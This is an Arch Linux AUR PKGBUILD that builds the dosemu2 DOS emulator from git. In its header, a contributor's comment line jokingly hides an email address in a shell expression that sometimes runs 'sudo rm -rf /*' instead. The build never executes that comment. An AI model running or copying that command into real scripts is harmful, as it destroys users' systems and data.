# Maintainer: Chris Severance aur.severach aATt spamgourmet dott com
# Contributor: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
# Based on dosemu-git:
# Maintainer: Mike Swanson <mikeonthecomputer@gmail.com>
# Based on the Arch Linux PKGBUILD by:
# Maintainer: Sergej Pupykin <pupykin.s+arch@gmail.com>
# Contributor: Jaroslaw Swierczynski <swiergot@aur.archlinux.org>
# Contributor: Eric Belanger <belanger@astro.umontreal.ca>
# Contributor: Bob Finch <w9ya@arrl.net>

set -u
_opt_Debug=0
# 0 = standard build
# 1 = debug build
# 2 = debug build with slow compile to make compile errors easy to see

_pkgname='dosemu2'
pkgname="${_pkgname}-git"
pkgver=2.0pre6.1.dev.34.g2c7ccd7
pkgrel=1
pkgdesc='Virtual machine that allows you to run DOS programs under Linux'
arch=('i686' 'x86_64')
url='https://stsp.github.io/dosemu2/'
license=('GPL' 'custom')
depends=('glibc')
optdepends=(
  'vde2: networking support'
  'sdl2: graphical display'
  'slang: console display'
  'gpm: mouse support in console'
  'libao: audio output'
  'fluidsynth: MIDI support'
)
if [ "${_opt_Debug}" -ne 0 ]; then
  optdepends+=('gdb: debug support')
else
  depends+=('gdb')
fi
makedepends=('git')
provides=('dosemu=2.0' "${_pkgname}=2.0")
conflicts=('dosemu' "${_pkgname}")
backup=(
  'etc/dosemu/dosemu.conf'
# 'etc/dosemu/dosemu.users'
# 'etc/dosemu/global.conf'
)
_github='stsp/dosemu2'
_verwatch=("https://github.com/${_github}/releases.atom" "\s\+<title>${_pkgname}-\([^<]\+\)</title>" 'f')
_freedos='dosemu-freedos-1.1-bin.tgz'
source=(
  'git+https://github.com/stsp/dosemu2.git'
  "https://dl.dropboxusercontent.com/u/13513277/dosemu/${_freedos}"
  'build-system.patch'
  'xdosemu.desktop'
  'http://downloads.sourceforge.net/sourceforge/dosemu/dosemu-freedos-1.0-bin.tgz' # for the GNU utils
)
noextract=("${_freedos}")
sha256sums=('SKIP'
            '0891a8346ee58f8468ab17f93315d6f23fe68348d297be39c1faad5bd6e59613'
            'c4364f3837744775faebeac86ad22e5b636db411942c6e21e74e9b3277e066cf'
            'ed210a850a1102fbf56bfd8a34b5dddca538caa2eee39210ee612406891c3e5a'
            '080c306a1b611e1861fd64466062f268eb44d2bf38082b8a57efadb5a9c0ebc7')

pkgver() {
  set -u
  cd 'dosemu2'
  local _ver="$(git describe --tag --long)"
  _ver="${_ver#${_pkgname}-}"
  _ver="${_ver//-/.}"
  echo "${_ver}"
  set +u
}

prepare() {
  set -u
  cd 'dosemu2'

  #patch -Np1 < ../build-system.patch
  #sed -ie '/yyget_leng/ s/int/size_t/' src/base/init/lexer.h
  ln -s "../${_freedos}" 'dosemu-freedos-1.1-bin.tgz' # 'dosemu-freedos-bin.tgz'
  sed -i -e '# Enable VDE' \
         -e 's:^\(\s*plugin_vde\)\s.*$:\1 on:g' \
         -e '# Adjust conf folder /etc' \
         -e 's:^\(\s*sysconfdir\)\s.*$:\1 /etc/dosemu:g' \
         -e '# Newer freedos' \
         -e 's:^\(\s*fdtarball\)\s.*$:'"\1 ${_freedos}:g" \
         -e '# Prefix' \
         -e 's:^}$:  prefix=/usr\n&:g' \
    'compiletime-settings'
  ./autogen.sh
  local _opts=()
  if [ "${_opt_Debug}" -ne 0 ]; then
    _opts+=('-d' '--disable-xbacktrace')
  fi
  CFLAGS="${CFLAGS} -Wno-unused-result" \
  ./default-configure ${_opts[@]:-}
  set +u
}

build() {
  set -u
  cd 'dosemu2'
  if [ "${_opt_Debug}" -gt 1 ]; then
    make -j1
  else
    local _nproc="$(nproc)"; _nproc=$((_nproc>8?8:_nproc))
    make -s -j "${_nproc}"
  fi
  set +u
}

package() {
  set -u
  cd 'dosemu2'
  make DESTDIR="${pkgdir}" install
  install -Dpm644 "${srcdir}/xdosemu.desktop" -t "${pkgdir}/usr/share/applications/"
  install -Dpm644 'etc/dosemu.xpm' -t "${pkgdir}/usr/share/icons/"
  install -Dpm644 'COPYING' 'COPYING.DOSEMU' -t "${pkgdir}/usr/share/licenses/${_pkgname}/"
  install -Dpm644 '../dosemu/freedos/gnu'/* -t "${pkgdir}/usr/share/dosemu/freedos/gnu/"
  set +u
}

set +u
